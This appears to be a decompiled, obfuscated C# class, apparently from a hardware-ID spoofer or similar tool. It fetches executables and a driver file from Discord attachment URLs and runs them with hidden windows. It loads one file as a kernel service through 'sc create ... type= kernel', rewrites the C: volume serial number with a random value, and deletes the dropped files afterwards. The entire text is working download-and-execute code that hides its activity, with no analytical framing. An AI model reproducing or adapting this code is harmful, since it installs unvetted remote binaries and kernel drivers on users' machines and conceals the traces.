using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

internal class Class12
{
	public static void smethod_0()
	{
		_003CModule_003E.Class0.smethod_0();
		smethod_4("sc create Win32x64_0 binPath= C:\\Windows\\Speech\\5kIRRg37FJ.dat type= kernel");
		Thread.Sleep(400);
		smethod_4("sc start Win32x64_0");
		smethod_4("sc stop Win32x64_0");
		smethod_4("sc delete Win32x64_0");
		File.Delete("C:\\Windows\\Speech\\5kIRRg37FJ.dat");
	}

	public static void smethod_1()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704851426404335767/t0.dat", "C:\\Windows\\Speech\\5kIRRg37FJ.dat");
		webClient.Proxy = null;
	}

	public static void smethod_2()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704851633699553280/ProxineGuard.dll", "C:\\Windows\\Speech\\ProxineGuard.dll");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/704851400882126929/704851838150901770/PowerSwap.exe", "C:\\Windows\\Speech\\PowerSwap.exe");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Windows\\Speech\\PowerSwap.exe";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Windows\\Speech\\PowerSwap.exe");
		File.Delete("C:\\Windows\\Speech\\ProxineGuard.dll");
	}

	public static void smethod_3()
	{
		_003CModule_003E.Class0.smethod_0();
		if (File.Exists("C:\\Windows\\System32\\volumeid.exe"))
		{
			Random random = new Random();
			string text = random.Next(1000, 9999) + "-" + random.Next(1000, 9999);
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.FileName = "cmd.exe";
			process.Start();
			process.StandardInput.WriteLine("cd C:\\Windows\\System32");
			process.StandardInput.WriteLine("volumeid C: " + text);
			Thread.Sleep(1000);
			process.Close();
		}
		else
		{
			Thread.Sleep(4700);
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718631285605662840/zo.exe", "C:\\Windows\\System32\\volumeid.exe");
			webClient.Proxy = null;
			Random random2 = new Random();
			string text2 = random2.Next(1000, 9999) + "-" + random2.Next(1000, 9999);
			Process process2 = new Process();
			process2.StartInfo.RedirectStandardInput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.FileName = "cmd.exe";
			process2.Start();
			process2.StandardInput.WriteLine("cd C:\\Windows\\System32");
			process2.StandardInput.WriteLine("volumeid C: " + text2);
			Thread.Sleep(1500);
			process2.Close();
		}
	}

	private static void smethod_4(string string_0)
	{
		_003CModule_003E.Class0.smethod_0();
		Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
		{
			CreateNoWindow = true,
			UseShellExecute = false,
			RedirectStandardError = true,
			RedirectStandardOutput = true
		});
		process.WaitForExit();
		process.StandardOutput.ReadToEnd();
		process.StandardError.ReadToEnd();
		_ = process.ExitCode;
		process.Close();
	}

	public Class12()
	{
		_003CModule_003E.Class0.smethod_0();
		base._002Ector();
	}

	static void smethod_15(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).CreateNoWindow = bool_0;
	}

	static void smethod_17(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).UseShellExecute = bool_0;
	}

	static void smethod_26(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardError = bool_0;
	}

	static void smethod_27(object object_0, bool bool_0)
	{
		((ProcessStartInfo)object_0).RedirectStandardOutput = bool_0;
	}

	static object smethod_28(ProcessStartInfo processStartInfo_0)
	{
		return Process.Start(processStartInfo_0);
	}
}
